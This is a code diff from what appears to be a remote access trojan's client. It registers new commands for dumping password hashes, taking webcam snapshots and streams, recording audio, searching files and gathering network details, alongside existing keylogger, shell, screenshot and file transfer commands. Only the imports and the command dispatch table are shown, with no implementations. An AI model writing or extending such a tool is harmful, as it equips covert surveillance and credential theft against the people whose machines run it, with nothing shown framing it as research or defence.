@@ -16,17 +16,23 @@ from common.constants import (
     DEFAULT_PORT,
     DOWNLOAD_ACTION,
     HANDSHAKE_ACTION,
+    HASHDUMP_ACTION,
     HELP_ACTION,
+    IPCONFIG_ACTION,
     KEYLOGGER_ACTION,
     MAX_RETRIES,
+    RECORD_AUDIO_ACTION,
     RETRY_BACKOFF_FACTOR,
     RETRY_DELAY,
     RETRY_DELAY_MAX,
     SCREENSHOT_ACTION,
+    SEARCH_ACTION,
     SHELL_ACTION,
     SOCKET_TIMEOUT_SEC,
     TEST_ACTION,
     UPLOAD_ACTION,
+    WEBCAM_SNAPSHOT_ACTION,
+    WEBCAM_STREAM_ACTION,
 )
 from client.commands.help import HelpCommand
 from client.commands.download import DownloadCommand
@@ -34,6 +40,12 @@ from client.commands.upload import UploadCommand
 from client.commands.shell import ShellCommand
 from client.commands.screenshot import ScreenshotCommand
 from client.commands.keylogger import KeyloggerCommand
+from client.commands.webcam import WebcamSnapshotCommand
+from client.commands.webcam_stream import WebcamStreamCommand
+from client.commands.hashdump import HashdumpCommand
+from client.commands.ipconfig import IpconfigCommand
+from client.commands.record_audio import RecordAudioCommand
+from client.commands.search import SearchCommand
 from common.protocol import (
     build_command,
     build_handshake_command,
@@ -73,6 +85,12 @@ class Client:
             SHELL_ACTION: ShellCommand(),
             SCREENSHOT_ACTION: ScreenshotCommand(),
             KEYLOGGER_ACTION: KeyloggerCommand(),
+            WEBCAM_SNAPSHOT_ACTION: WebcamSnapshotCommand(),
+            WEBCAM_STREAM_ACTION: WebcamStreamCommand(),
+            HASHDUMP_ACTION: HashdumpCommand(),
+            IPCONFIG_ACTION: IpconfigCommand(),
+            RECORD_AUDIO_ACTION: RecordAudioCommand(),
+            SEARCH_ACTION: SearchCommand(),
         }
         self._retry_count = 0
         self._shutdown = False
